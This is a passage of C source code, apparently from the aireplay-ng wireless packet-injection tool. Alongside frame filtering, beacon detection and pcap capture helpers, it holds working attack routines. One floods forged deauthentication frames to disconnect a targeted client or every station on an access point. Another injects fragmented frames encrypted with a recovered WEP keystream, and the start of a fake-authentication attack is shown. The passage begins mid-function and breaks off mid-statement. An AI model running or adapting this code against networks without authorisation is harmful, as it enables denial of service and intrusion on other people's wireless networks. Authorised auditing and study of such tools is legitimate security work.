}\n    else\n    {\n        _wi_in = _wi_out;\n        dev.fd_in = dev.fd_out;\n\n        /* XXX */\n        dev.arptype_in = dev.arptype_out;\n        wi_get_mac(_wi_in, dev.mac_in);\n    }\n\n    wi_get_mac(_wi_out, dev.mac_out);\n\n    return 0;\n}\n\nint set_bitrate(struct wif *wi, int rate)\n{\n    int i, newrate;\n\n    if( wi_set_rate(wi, rate) )\n        return 1;\n\n//    if( reset_ifaces() )\n//        return 1;\n\n    //Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead\n    if (rate == 5500000 && wi_get_rate(wi) != 5500000) {\n\tif( wi_set_rate(wi, 5000000) )\n\t    return 1;\n    }\n\n    newrate = wi_get_rate(wi);\n    for(i=0; i<RATE_NUM; i++)\n    {\n        if(bitrates[i] == rate)\n            break;\n    }\n    if(i==RATE_NUM)\n        i=-1;\n    if( newrate != rate )\n    {\n        if(i!=-1)\n        {\n            if( i>0 )\n            {\n                if(bitrates[i-1] >= newrate)\n                {\n                    printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n                    return 1;\n                }\n            }\n            if( i<RATE_NUM-1 )\n            {\n                if(bitrates[i+1] <= newrate)\n                {\n                    printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n                    return 1;\n                }\n            }\n            return 0;\n        }\n        printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n        return 1;\n    }\n    return 0;\n}\n\nint send_packet(void *buf, size_t count)\n{\n\tstruct wif *wi = _wi_out; /* XXX globals suck */\n\tunsigned char *pkt = (unsigned char*) buf;\n\n\tif( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)\n\t{\n\t\tpkt[22] = (nb_pkt_sent & 0x0000000F) << 4;\n\t\tpkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;\n\t}\n\n\tif (wi_write(wi, buf, count, NULL) == -1) {\n\t\tswitch (errno) {\n\t\tcase EAGAIN:\n\t\tcase ENOBUFS:\n\t\t\tusleep(10000);\n\t\t\treturn 0; /* XXX not sure I like this... -sorbo */\n\t\t}\n\n\t\tperror(\"wi_write()\");\n\t\treturn -1;\n\t}\n\n\tnb_pkt_sent++;\n\treturn 0;\n}\n\nint read_packet(void *buf, size_t count, struct rx_info *ri)\n{\n\tstruct wif *wi = _wi_in; /* XXX */\n\tint rc;\n\n        rc = wi_read(wi, buf, count, ri);\n        if (rc == -1) {\n            switch (errno) {\n            case EAGAIN:\n                    return 0;\n            }\n\n            perror(\"wi_read()\");\n            return -1;\n        }\n\n\treturn rc;\n}\n\nvoid read_sleep( int usec )\n{\n    struct timeval tv, tv2, tv3;\n    int caplen;\n    fd_set rfds;\n\n    gettimeofday(&tv, NULL);\n    gettimeofday(&tv2, NULL);\n\n    tv3.tv_sec=0;\n    tv3.tv_usec=10000;\n\n    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )\n    {\n        FD_ZERO( &rfds );\n        FD_SET( dev.fd_in, &rfds );\n\n        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )\n        {\n            continue;\n        }\n\n        if( FD_ISSET( dev.fd_in, &rfds ) )\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        gettimeofday(&tv2, NULL);\n    }\n}\n\n\nint filter_packet( unsigned char *h80211, int caplen )\n{\n    int z, mi_b, mi_s, mi_d, ext=0, qos;\n\n    if(caplen <= 0)\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 )\n    {\n        qos = 1; /* 802.11e QoS */\n        z+=2;\n    }\n\n    if( (h80211[0] & 0x0C) == 0x08)    //if data packet\n        ext = z-24; //how many bytes longer than default ieee80211 header\n\n    /* check length */\n    if( caplen-ext < opt.f_minlen ||\n        caplen-ext > opt.f_maxlen ) return( 1 );\n\n    /* check the frame control bytes */\n\n    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&\n        opt.f_type    >= 0 ) return( 1 );\n\n    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)\n        opt.f_subtype >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&\n        opt.f_tods    >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&\n        opt.f_fromds  >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&\n        opt.f_iswep   >= 0 ) return( 1 );\n\n    /* check the extended IV (TKIP) flag */\n\n    if( opt.f_type == 2 && opt.f_iswep == 1 &&\n        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );\n\n    /* MAC address checking */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n        default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n    }\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )\n            return( 1 );\n\n    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )\n            return( 1 );\n\n    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )\n            return( 1 );\n\n    /* this one looks good */\n\n    return( 0 );\n}\n\nint wait_for_beacon(unsigned char *bssid, unsigned char *capa, char *essid)\n{\n    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;\n    unsigned char pkt_sniff[4096];\n    struct timeval tv,tv2;\n    char essid2[33];\n\n    gettimeofday(&tv, NULL);\n    while (1)\n    {\n        len = 0;\n        while (len < 22)\n        {\n            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);\n\n            gettimeofday(&tv2, NULL);\n            if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame\n            {\n                return -1;\n            }\n            if(len <= 0) usleep(1);\n        }\n        if (! memcmp(pkt_sniff, \"\\x80\", 1))\n        {\n            pos = 0;\n            taglen = 22;    //initial value to get the fixed tags parsing started\n            taglen+= 12;    //skip fixed tags in frames\n            do\n            {\n                pos    += taglen + 2;\n                tagtype = pkt_sniff[pos];\n                taglen  = pkt_sniff[pos+1];\n            } while(tagtype != 3 && pos < len-2);\n\n            if(tagtype != 3) continue;\n            if(taglen != 1) continue;\n            if(pos+2+taglen > len) continue;\n\n            chan = pkt_sniff[pos+2];\n\n            if(essid)\n            {\n                pos = 0;\n                taglen = 22;    //initial value to get the fixed tags parsing started\n                taglen+= 12;    //skip fixed tags in frames\n                do\n                {\n                    pos    += taglen + 2;\n                    tagtype = pkt_sniff[pos];\n                    taglen  = pkt_sniff[pos+1];\n                } while(tagtype != 0 && pos < len-2);\n\n                if(tagtype != 0) continue;\n                if(taglen <= 1)\n                {\n                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;\n                    else continue;\n                }\n                if(pos+2+taglen > len) continue;\n\n                if(taglen > 32)taglen = 32;\n\n                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)\n                {\n                    break;\n                }\n\n                /* if bssid is given, copy essid */\n                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)\n                {\n                    memset(essid, 0, 33);\n                    memcpy(essid, pkt_sniff+pos+2, taglen);\n                    break;\n                }\n\n                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */\n                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)\n                {\n                    memset(essid, 0, 33);\n                    memcpy(essid, pkt_sniff+pos+2, taglen);\n                    memcpy(bssid, pkt_sniff+10, 6);\n                    printf(\"Found BSSID \\\"%02X:%02X:%02X:%02X:%02X:%02X\\\" to given ESSID \\\"%s\\\".\\n\", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);\n                    break;\n                }\n\n                /* if essid and bssid are given, check both */\n                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)\n                {\n                    memset(essid2, 0, 33);\n                    memcpy(essid2, pkt_sniff+pos+2, taglen);\n                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)\n                        break;\n                    else\n                    {\n                        printf(\"For the given BSSID \\\"%02X:%02X:%02X:%02X:%02X:%02X\\\", there is an ESSID mismatch!\\n\", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);\n                        printf(\"Found ESSID \\\"%s\\\" vs. specified ESSID \\\"%s\\\"\\n\", essid2, essid);\n                        printf(\"Using the given one, double check it to be sure its correct!\\n\");\n                        break;\n                    }\n                }\n            }\n        }\n    }\n\n    if(capa) memcpy(capa, pkt_sniff+34, 2);\n\n    return chan;\n}\n\n/**\n    if bssid != NULL its looking for a beacon frame\n*/\nint attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)\n{\n    int ap_chan=0, iface_chan=0;\n\n    iface_chan = wi_get_channel(wi);\n\n    if(iface_chan == -1 && !opt.ignore_negative_one)\n    {\n        PCT; printf(\"Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\\n\",\n                wi_get_ifname(wi));\n        return -1;\n    }\n\n    if(bssid != NULL)\n    {\n        ap_chan = wait_for_beacon(bssid, capa, essid);\n        if(ap_chan < 0)\n        {\n            PCT; printf(\"No such BSSID available.\\n\");\n            return -1;\n        }\n        if((ap_chan != iface_chan) && (iface_chan != -1 || !opt.ignore_negative_one))\n        {\n            PCT; printf(\"%s is on channel %d, but the AP uses channel %d\\n\", wi_get_ifname(wi), iface_chan, ap_chan);\n            return -1;\n        }\n    }\n\n    return 0;\n}\n\nint getnet( unsigned char* capa, int filter, int force)\n{\n    unsigned char *bssid;\n\n    if(opt.nodetect)\n        return 0;\n\n    if(filter)\n        bssid = opt.f_bssid;\n    else\n        bssid = opt.r_bssid;\n\n\n    if( memcmp(bssid, NULL_MAC, 6) )\n    {\n        PCT; printf(\"Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\\n\",\n                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));\n    }\n    else if(strlen(opt.r_essid) > 0)\n    {\n        PCT; printf(\"Waiting for beacon frame (ESSID: %s) on channel %d\\n\", opt.r_essid,wi_get_channel(_wi_in));\n    }\n    else if(force)\n    {\n        PCT;\n        if(filter)\n        {\n            printf(\"Please specify at least a BSSID (-b) or an ESSID (-e)\\n\");\n        }\n        else\n        {\n            printf(\"Please specify at least a BSSID (-a) or an ESSID (-e)\\n\");\n        }\n        return( 1 );\n    }\n    else\n        return 0;\n\n    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)\n    {\n        if(memcmp(bssid, NULL_MAC, 6))\n        {\n            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)\n            {\n                printf( \"Please specify an ESSID (-e).\\n\" );\n            }\n        }\n\n        if(!memcmp(bssid, NULL_MAC, 6))\n        {\n            if(strlen(opt.r_essid) > 0)\n            {\n                printf( \"Please specify a BSSID (-a).\\n\" );\n            }\n        }\n        return( 1 );\n    }\n\n    return 0;\n}\n\nint xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)\n{\n    int i=0;\n\n    for (i=0; i<len; i++) {\n        ph80211[i] = ph80211[i] ^ keystream[i];\n    }\n\n    return 0;\n}\n\nint capture_ask_packet( int *caplen, int just_grab )\n{\n    time_t tr;\n    struct timeval tv;\n    struct tm *lt;\n\n    fd_set rfds;\n    long nb_pkt_read;\n    int i, j, n, mi_b=0, mi_s=0, mi_d=0, mi_t=0, mi_r=0, is_wds=0, key_index_offset;\n    int ret, z;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n\n    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;\n    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;\n    if( opt.f_type    < 0 ) opt.f_type    =    2;\n    if( opt.f_subtype < 0 ) opt.f_subtype =    0;\n    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;\n\n    tr = time( NULL );\n\n    nb_pkt_read = 0;\n\n    signal( SIGINT, SIG_DFL );\n\n    while( 1 )\n    {\n        if( time( NULL ) - tr > 0 )\n        {\n            tr = time( NULL );\n            printf( \"\\rRead %ld packets...\\r\", nb_pkt_read );\n            fflush( stdout );\n        }\n\n        if( opt.s_file == NULL )\n        {\n            FD_ZERO( &rfds );\n            FD_SET( dev.fd_in, &rfds );\n\n            tv.tv_sec  = 1;\n            tv.tv_usec = 0;\n\n            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n            {\n                if( errno == EINTR ) continue;\n                perror( \"select failed\" );\n                return( 1 );\n            }\n\n            if( ! FD_ISSET( dev.fd_in, &rfds ) )\n                continue;\n\n            gettimeofday( &tv, NULL );\n\n            *caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( *caplen  < 0 ) return( 1 );\n            if( *caplen == 0 ) continue;\n        }\n        else\n        {\n            /* there are no hidden backdoors in this source code */\n\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                printf( \"\\r\\33[KEnd of file.\\n\" );\n                return( 1 );\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = *caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                return( 1 );\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                printf( \"\\r\\33[KEnd of file.\\n\" );\n                return( 1 );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) *caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        if( filter_packet( h80211, *caplen ) != 0 )\n            continue;\n\n        if(opt.fast)\n            break;\n\n        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n            z+=2;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; is_wds = 0; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; is_wds = 0; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; is_wds = 0; break;\n            case  3: mi_t = 10; mi_r =  4; mi_d = 16; mi_s = 24; is_wds = 1; break;  // WDS packet\n        }\n\n        printf( \"\\n\\n        Size: %d, FromDS: %d, ToDS: %d\",\n                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );\n\n        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )\n        {\n//             if (is_wds) key_index_offset = 33; // WDS packets have an additional MAC, so the key index is at byte 33\n//             else key_index_offset = 27;\n            key_index_offset = z+3;\n\n            if( ( h80211[key_index_offset] & 0x20 ) == 0 )\n                printf( \" (WEP)\" );\n            else\n                printf( \" (WPA)\" );\n        }\n\n        printf( \"\\n\\n\" );\n\n        if (is_wds) {\n            printf( \"        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_t    ], h80211[mi_t + 1],\n                    h80211[mi_t + 2], h80211[mi_t + 3],\n                    h80211[mi_t + 4], h80211[mi_t + 5] );\n\n            printf( \"           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_r    ], h80211[mi_r + 1],\n                    h80211[mi_r + 2], h80211[mi_r + 3],\n                    h80211[mi_r + 4], h80211[mi_r + 5] );\n        } else {\n            printf( \"              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_b    ], h80211[mi_b + 1],\n                    h80211[mi_b + 2], h80211[mi_b + 3],\n                    h80211[mi_b + 4], h80211[mi_b + 5] );\n        }\n\n        printf( \"          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                h80211[mi_d    ], h80211[mi_d + 1],\n                h80211[mi_d + 2], h80211[mi_d + 3],\n                h80211[mi_d + 4], h80211[mi_d + 5] );\n\n        printf( \"         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                h80211[mi_s    ], h80211[mi_s + 1],\n                h80211[mi_s + 2], h80211[mi_s + 3],\n                h80211[mi_s + 4], h80211[mi_s + 5] );\n\n        /* print a hex dump of the packet */\n\n        for( i = 0; i < *caplen; i++ )\n        {\n            if( ( i & 15 ) == 0 )\n            {\n                if( i == 224 )\n                {\n                    printf( \"\\n        --- CUT ---\" );\n                    break;\n                }\n\n                printf( \"\\n        0x%04x:  \", i );\n            }\n\n            printf( \"%02x\", h80211[i] );\n\n            if( ( i & 1 ) != 0 )\n                printf( \" \" );\n\n            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )\n            {\n                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )\n                {\n                    printf( \"  \" );\n                    if( ( j & 1 ) != 0 )\n                        printf( \" \" );\n                }\n\n                printf( \" \" );\n\n                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )\n                    printf( \"%c\", ( h80211[i - 15 + j] <  32 ||\n                                    h80211[i - 15 + j] > 126 )\n                                  ? '.' : h80211[i - 15 + j] );\n            }\n\n            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )\n            {\n                printf( \" \" );\n\n                for( j = 0; j < 16; j++ )\n                    printf( \"%c\", ( h80211[i - 15 + j] <  32 ||\n                                    h80211[i - 15 + j] > 127 )\n                                  ? '.' : h80211[i - 15 + j] );\n            }\n        }\n\n        printf( \"\\n\\nUse this packet ? \" );\n        fflush( stdout );\n        ret=0;\n        while(!ret) ret = scanf( \"%s\", tmpbuf );\n        printf( \"\\n\" );\n\n        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )\n            break;\n    }\n\n    if(!just_grab)\n    {\n        pfh_out.magic         = TCPDUMP_MAGIC;\n        pfh_out.version_major = PCAP_VERSION_MAJOR;\n        pfh_out.version_minor = PCAP_VERSION_MINOR;\n        pfh_out.thiszone      = 0;\n        pfh_out.sigfigs       = 0;\n        pfh_out.snaplen       = 65535;\n        pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n        lt = localtime( (const time_t *) &tv.tv_sec );\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                \"replay_src-%02d%02d-%02d%02d%02d.cap\",\n                lt->tm_mon + 1, lt->tm_mday,\n                lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n        printf( \"Saving chosen packet in %s\\n\", strbuf );\n\n        if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n        {\n            perror( \"fopen failed\" );\n            return( 1 );\n        }\n\n        n = sizeof( struct pcap_file_header );\n\n        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\\n\" );\n            return( 1 );\n        }\n\n        pkh.tv_sec  = tv.tv_sec;\n        pkh.tv_usec = tv.tv_usec;\n        pkh.caplen  = *caplen;\n        pkh.len     = *caplen;\n\n        n = sizeof( pkh );\n\n        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\" );\n            return( 1 );\n        }\n\n        n = pkh.caplen;\n\n        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\" );\n            return( 1 );\n        }\n\n        fclose( f_cap_out );\n    }\n\n    return( 0 );\n}\n\nint read_prga(unsigned char **dest, char *file)\n{\n    FILE *f;\n    int size;\n\n    if(file == NULL) return( 1 );\n    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);\n\n    f = fopen(file, \"r\");\n\n    if(f == NULL)\n    {\n         printf(\"Error opening %s\\n\", file);\n         return( 1 );\n    }\n\n    fseek(f, 0, SEEK_END);\n    size = ftell(f);\n    rewind(f);\n\n    if(size > 1500) size = 1500;\n\n    if( fread( (*dest), size, 1, f ) != 1 )\n    {\n    \tfclose(f);\n        fprintf( stderr, \"fread failed\\n\" );\n        return( 1 );\n    }\n\n    opt.prgalen = size;\n\n    fclose(f);\n    return( 0 );\n}\n\nvoid add_icv(unsigned char *input, int len, int offset)\n{\n    unsigned long crc = 0xFFFFFFFF;\n    int n=0;\n\n    for( n = offset; n < len; n++ )\n        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);\n\n    crc = ~crc;\n\n    input[len]   = (crc      ) & 0xFF;\n    input[len+1] = (crc >>  8) & 0xFF;\n    input[len+2] = (crc >> 16) & 0xFF;\n    input[len+3] = (crc >> 24) & 0xFF;\n\n    return;\n}\n\nvoid send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, unsigned char *keystream, int fragsize, int ska)\n{\n    int t, u;\n    int data_size;\n    unsigned char frag[32+fragsize];\n    int pack_size;\n    int header_size=24;\n\n    data_size = packet_len-header_size;\n    packet[23] = (rand() % 0xFF);\n\n    for (t=0; t+=fragsize;)\n    {\n\n    //Copy header\n        memcpy(frag, packet, header_size);\n\n    //Copy IV + KeyIndex\n        memcpy(frag+header_size, iv, 4);\n\n    //Copy data\n        if(fragsize <= packet_len-(header_size+t-fragsize))\n            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);\n        else\n            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));\n\n    //Make ToDS frame\n        if(!ska)\n        {\n            frag[1] |= 1;\n            frag[1] &= 253;\n        }\n\n    //Set fragment bit\n        if (t< data_size) frag[1] |= 4;\n        if (t>=data_size) frag[1] &= 251;\n\n    //Fragment number\n        frag[22] = 0;\n        for (u=t; u-=fragsize;)\n        {\n            frag[22] += 1;\n        }\n//        frag[23] = 0;\n\n    //Calculate packet length\n        if(fragsize <= packet_len-(header_size+t-fragsize))\n            pack_size = header_size + 4 + fragsize;\n        else\n            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));\n\n    //Add ICV\n        add_icv(frag, pack_size, header_size + 4);\n        pack_size += 4;\n\n    //Encrypt\n        xor_keystream(frag + header_size + 4, keystream, fragsize+4);\n\n    //Send\n        send_packet(frag, pack_size);\n        if (t<data_size)usleep(100);\n\n        if (t>=data_size) break;\n    }\n\n}\n\nint do_attack_deauth( void )\n{\n    int i, n;\n    int aacks, sacks, caplen;\n    struct timeval tv;\n    fd_set rfds;\n\n    if(getnet(NULL, 0, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )\n        printf( \"NB: this attack is more effective when targeting\\n\"\n                \"a connected wireless client (-c <client's mac>).\\n\" );\n\n    n = 0;\n\n    while( 1 )\n    {\n        if( opt.a_count > 0 && ++n > opt.a_count )\n            break;\n\n        usleep( 180000 );\n\n        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )\n        {\n            /* deauthenticate the target */\n\n            memcpy( h80211, DEAUTH_REQ, 26 );\n            memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n            aacks = 0;\n            sacks = 0;\n            for( i = 0; i < 64; i++ )\n            {\n                if(i == 0)\n                {\n                    PCT; printf( \"Sending 64 directed DeAuth. STMAC:\"\n                                \" [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\\r\",\n                                opt.r_dmac[0],  opt.r_dmac[1],\n                                opt.r_dmac[2],  opt.r_dmac[3],\n                                opt.r_dmac[4],  opt.r_dmac[5],\n                                sacks, aacks );\n                }\n\n                memcpy( h80211 +  4, opt.r_dmac,  6 );\n                memcpy( h80211 + 10, opt.r_bssid, 6 );\n\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_dmac,  6 );\n\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n\n                while( 1 )\n                {\n                    FD_ZERO( &rfds );\n                    FD_SET( dev.fd_in, &rfds );\n\n                    tv.tv_sec  = 0;\n                    tv.tv_usec = 1000;\n\n                    if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n                    {\n                        if( errno == EINTR ) continue;\n                        perror( \"select failed\" );\n                        return( 1 );\n                    }\n\n                    if( ! FD_ISSET( dev.fd_in, &rfds ) )\n                        break;\n\n                    caplen = read_packet( tmpbuf, sizeof( tmpbuf ), NULL );\n\n                    if(caplen <= 0 ) break;\n                    if(caplen != 10) continue;\n                    if( tmpbuf[0] == 0xD4)\n                    {\n                        if( memcmp(tmpbuf+4, opt.r_dmac, 6) == 0 )\n                        {\n                            aacks++;\n                        }\n                        if( memcmp(tmpbuf+4, opt.r_bssid, 6) == 0 )\n                        {\n                            sacks++;\n                        }\n                        PCT; printf( \"Sending 64 directed DeAuth. STMAC:\"\n                                    \" [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\\r\",\n                                    opt.r_dmac[0],  opt.r_dmac[1],\n                                    opt.r_dmac[2],  opt.r_dmac[3],\n                                    opt.r_dmac[4],  opt.r_dmac[5],\n                                    sacks, aacks );\n                    }\n                }\n            }\n            printf(\"\\n\");\n        }\n        else\n        {\n            /* deauthenticate all stations */\n\n            PCT; printf( \"Sending DeAuth to broadcast -- BSSID:\"\n                         \" [%02X:%02X:%02X:%02X:%02X:%02X]\\n\",\n                         opt.r_bssid[0], opt.r_bssid[1],\n                         opt.r_bssid[2], opt.r_bssid[3],\n                         opt.r_bssid[4], opt.r_bssid[5] );\n\n            memcpy( h80211, DEAUTH_REQ, 26 );\n\n            memcpy( h80211 +  4, BROADCAST,   6 );\n            memcpy( h80211 + 10, opt.r_bssid, 6 );\n            memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n            for( i = 0; i < 128; i++ )\n            {\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_fake_auth( void )\n{\n    time_t tt, tr;\n    struct timeval tv, tv2, tv3;\n\n    fd_set rfds;\n    int i, n, state, caplen, z;\n    int mi_b, mi_s, mi_d;\n    int x_send;\n    int kas;\n    int tries;\n    int retry = 0;\n    int abort;\n    int gotack = 0;\n    unsigned char capa[2];\n    int deauth_wait=3;\n    int ska=0;\n    int keystreamlen=0;\n    int challengelen=0;\n    int weight[16];\n    int notice=0;\n    int packets=0;\n    int aid=0;\n\n    unsigned char ackbuf[14];\n    unsigned char ctsbuf[10];\n    unsigned char iv[4];\n    unsigned char challenge[2048];\n    unsigned char keystream[2048];\n\n\n    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(capa, 0, 1) != 0)\n        return 1;\n\n    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)\n    {\n        printf( \"Please specify an ESSID (-e).\\n\" );\n        return 1;\n    }\n\n    memcpy( ackbuf, \"\\xD4\\x00\\x00\\x00\", 4 );\n    memcpy( ackbuf +  4, opt.r_bssid, 6 );\n    memset( ackbuf + 